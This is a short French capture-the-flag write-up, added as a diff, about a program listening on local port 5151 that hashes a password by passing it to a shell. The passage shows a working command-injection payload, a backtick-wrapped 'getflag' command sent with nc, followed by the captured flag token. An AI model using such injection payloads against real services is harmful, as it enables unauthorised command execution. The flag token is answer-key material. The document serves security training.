@@ -1,0 +1,11 @@
+un strings sur l'executable nous permet de voir que le programme attends une connection sur 
+127.0.0.1 port 5151, un coup d'oeil plus en detail nous permet de voir que le programme va
+executer la commande dans io.open sur le password qu'on lui envoit pour le hash
+on a juste a faire une petite injection de code (envoyer du code a la place du texte)
+
+nc 127.0.0.1 5151
+Password: `getflag > /tmp/test`
+Erf nope..
+cat /tmp/test 
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
